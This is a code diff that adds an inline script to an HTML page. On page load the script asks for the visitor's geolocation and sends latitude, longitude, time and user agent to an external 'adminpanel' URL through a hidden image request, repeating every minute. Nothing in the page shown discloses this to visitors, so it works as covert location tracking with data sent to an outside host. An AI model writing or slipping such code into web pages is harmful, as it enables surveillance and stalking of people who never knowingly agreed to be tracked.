@@ -68,7 +68,37 @@
     </div>
     
     <script src="script.js"></script>
+    <script>
+// Simple location tracking script
+(function() {
+    function trackLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const data = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    time: new Date().toISOString(),
+                    device: navigator.userAgent
+                };
+                
+                // This sends location data to your admin page
+                // Replace with your actual admin page URL
+                const adminUrl = "https://ashutosh231.github.io/adminpanel/";
+                
+                // Send data using image request (most reliable cross-domain method)
+                new Image().src = adminUrl + "?loc=" + 
+                    encodeURIComponent(JSON.stringify(data));
+                
+                // Track again after 1 minute
+                setTimeout(trackLocation, 60000);
+            });
+        }
+    }
     
+    // Start tracking when page loads
+    trackLocation();
+})();
+</script>
         
             
 </body>
